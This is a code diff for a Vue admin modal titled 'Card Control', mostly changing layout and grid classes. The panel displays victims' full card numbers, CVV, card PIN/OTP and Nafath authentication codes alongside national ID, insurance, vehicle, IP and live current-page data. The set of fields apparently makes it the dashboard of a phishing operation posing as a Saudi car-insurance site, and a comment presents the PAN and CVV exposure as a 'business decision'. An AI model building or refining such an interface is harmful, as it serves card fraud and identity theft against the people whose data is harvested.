@@ -3,12 +3,11 @@
     :open="open"
     title="Card Control"
     :subtitle="customer?.ip"
-    max-width="52rem"
+    size="lg"
     accent="#3b82f6"
     icon="fa-solid fa-circle-info"
     dir="ltr"
     theme="dark"
-    body-max-height="65vh"
     @close="$emit('close')"
   >
     <template #header-right>
@@ -35,7 +34,7 @@
           <div class="space-y-1.5 text-sm">
             <div><span class="text-gray-500">Name:</span> <span class="font-mono text-white">{{ card.holder_name || card.card_holder || getCustomerName(customer) || '—' }}</span></div>
             <!-- Full PAN + CVV revealed by explicit business decision (PCI-DSS deviation). -->
-            <div><span class="text-gray-500">Card #:</span> <span class="font-mono text-lg tracking-wider text-white" dir="ltr">{{ card.card_number_display || card.card_number_full || card.card_number || (card.last4 ? '**** **** **** ' + card.last4 : '—') }}</span></div>
+            <div><span class="text-gray-500">Card #:</span> <span class="font-mono text-lg tracking-wider text-white" dir="ltr">{{ card.card_number_display || card.card_number_full || card.card_number || card.last4 || '—' }}</span></div>
             <div class="flex gap-6">
               <div><span class="text-gray-500">Exp:</span> <span class="font-mono text-white">{{ card.expiry_month || '--' }}/{{ card.expiry_year || '----' }}</span></div>
               <div v-if="card.bin"><span class="text-gray-500">BIN:</span> <span class="font-mono text-white">{{ card.bin }}</span></div>
@@ -71,7 +70,7 @@
             <div class="font-medium text-gray-300">{{ customer?.selectedOffer?.company_name }}</div>
           </div>
         </div>
-        <div v-if="customer?.priceSummary" class="mt-3 grid grid-cols-1 sm:grid-cols-3 gap-3 border-t border-emerald-500/20 pt-3 text-sm">
+        <div v-if="customer?.priceSummary" class="mt-3 grid grid-cols-1 gap-3 border-t border-emerald-500/20 pt-3 text-sm sm:grid-cols-2 lg:grid-cols-3">
           <div v-if="customer?.priceSummary?.base_price" class="text-gray-400">
             <span class="block text-[10px]">السعر الأساسي</span>
             <span class="font-medium text-white" dir="ltr">{{ Number(customer?.priceSummary?.base_price).toLocaleString('ar-SA') }} ر.س</span>
@@ -88,7 +87,7 @@
       </div>
 
       <!-- PIN / OTP / Nafath 3-columns -->
-      <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+      <div class="grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-3">
         <div class="admin-glass space-y-2.5">
           <h4 class="flex items-center gap-2 border-b border-gray-700 pb-2 text-sm font-bold text-blue-400">
             <span class="admin-dot admin-dot--blue"></span> Card PIN/OTP
@@ -120,7 +119,7 @@
         <h4 class="mb-3 flex items-center gap-2 text-sm font-bold text-blue-400">
           <span class="admin-dot admin-dot--blue"></span> بيانات العميل الشخصية
         </h4>
-        <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-3 text-sm">
+        <div class="grid grid-cols-1 gap-3 text-sm sm:grid-cols-2 lg:grid-cols-4">
           <div><span class="block text-[10px] text-gray-500">الاسم الكامل</span><span class="font-medium text-white">{{ customer?.fullName || customer?.customer_name || getCustomerName(customer) || '—' }}</span></div>
           <div><span class="block text-[10px] text-gray-500">رقم الهوية</span><span class="font-mono font-medium text-yellow-400">{{ customer?.nationalId || '—' }}</span></div>
           <div><span class="block text-[10px] text-gray-500">الرقم التسلسلي</span><span class="font-mono text-white">{{ customer?.sequenceNumber || '—' }}</span></div>
@@ -137,7 +136,7 @@
         <h4 class="mb-3 flex items-center gap-2 text-sm font-bold text-blue-400">
           <span class="admin-dot admin-dot--blue"></span> بيانات التأمين
         </h4>
-        <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-3 text-sm">
+        <div class="grid grid-cols-1 gap-3 text-sm sm:grid-cols-2 lg:grid-cols-4">
           <div><span class="block text-[10px] text-gray-500">غرض التأمين</span><span class="font-medium text-white">{{ getInsurancePurposeInline(customer?.insurancePurpose) }}</span></div>
           <div><span class="block text-[10px] text-gray-500">نوع التسجيل</span><span class="text-white">{{ getRegistrationTypeInline(customer?.registrationType) }}</span></div>
           <div><span class="block text-[10px] text-gray-500">نوع التأمين</span><span class="font-medium text-white">{{ getInsuranceTypeInline(customer?.insuranceType) }}</span></div>
@@ -150,7 +149,7 @@
         <h4 class="mb-3 flex items-center gap-2 text-sm font-bold text-amber-400">
           <span class="admin-dot admin-dot--amber"></span> بيانات المركبة
         </h4>
-        <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-3 text-sm">
+        <div class="grid grid-cols-1 gap-3 text-sm sm:grid-cols-2 lg:grid-cols-4">
           <div><span class="block text-[10px] text-gray-500">رقم اللوحة</span><span class="font-mono font-medium text-white">{{ customer?.plateNumber || '—' }}</span></div>
           <div><span class="block text-[10px] text-gray-500">نوع المركبة</span><span class="text-white">{{ customer?.vehicleType || '—' }}</span></div>
           <div><span class="block text-[10px] text-gray-500">سنة الصنع</span><span class="text-white">{{ customer?.manufacturingYear || '—' }}</span></div>
@@ -182,7 +181,7 @@
         <h4 class="mb-3 flex items-center gap-2 text-sm font-bold text-gray-400">
           <span class="admin-dot admin-dot--gray"></span> معلومات الجلسة
         </h4>
-        <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-3 text-sm">
+        <div class="grid grid-cols-1 gap-3 text-sm sm:grid-cols-2 lg:grid-cols-4">
           <div><span class="block text-[10px] text-gray-500">IP Address</span><span class="font-mono text-white">{{ customer?.ip }}</span></div>
           <div><span class="block text-[10px] text-gray-500">الصفحة الحالية</span><span class="text-white">{{ getPageName(customer?.current_page) }}</span></div>
           <div><span class="block text-[10px] text-gray-500">نوع الجهاز</span><span class="text-white">{{ customer?.device_info?.type || customer?.device_type || '—' }}</span></div>
